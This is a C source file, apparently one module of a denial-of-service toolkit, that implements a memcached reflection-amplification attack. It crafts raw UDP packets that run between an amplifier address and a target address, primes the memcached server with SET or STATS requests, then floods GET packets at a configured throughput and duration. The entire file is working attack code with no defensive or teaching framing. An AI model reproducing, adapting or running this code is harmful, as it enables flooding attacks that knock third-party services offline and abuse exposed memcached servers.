
#include "venus.h"
#include "strix.h"
#include "memcachedforge.h"
#include "common/common.h"
#include "common/blacksmith.h"
#include "netuno/netuno.h"

#include "venus.h"
#define NOSIGNAL  0
#define SIGNAL_STOP 1
#define SIGNAL_ERROR 2

#define GetPort( port ) ( port > 0 ) ? port : MEMCACHED_DEFAULT_PORT

static AttackPlan * createAttackDataGETSET( AttackDraft *draft )
{
  AttackPlan *newData;
  int arg;

  memalloc( (void *)&newData, sizeof( AttackPlan ) );
  arg = MEMCACHED_SET;
  newData->setPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedText, &arg );
  arg = MEMCACHED_GET;
  newData->getPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedText, &arg );
  newData->initialThroughput = draft->throughput;
  newData->timer = draft->timer;

  return newData;
}

static AttackPlan * createAttackDataSTATS( AttackDraft *draft )
{
    AttackPlan *newData;
    int arg;

    memalloc( (void *)&newData, sizeof( AttackPlan ) );
    arg = MEMCACHED_STAT;
    newData->setPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedBinary, &arg );
    newData->getPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedText, &arg );
    newData->initialThroughput = draft->throughput;
    newData->timer = draft->timer;

    return newData;
}

void executeAttack( AttackPlan * atkData )
{
    int sock = CreateSocket(RAW, BLOCK);
    if( SendPacket(sock, atkData->setPacket) < 0 )
    {
        Efatal(ERROR_MEMCACHED, "error memcached\n");
    }
    CloseSocket(sock);
    StartNetunoInjector( atkData->getPacket, atkData->initialThroughput, atkData->timer);
  
}

int  ExecuteMemcachedMirror( void *p_draft )
{
    AttackPlan *plan;
    AttackDraft *draft = (AttackDraft *) p_draft;

    switch( draft->type )
    {
        case MEMCACHED_GETSET:
            plan = createAttackDataGETSET( draft );
            break;

        case MEMCACHED_STATS:
        default:
            plan = createAttackDataSTATS( draft );
            break;
    }
    executeAttack(plan);
    return 0;
}


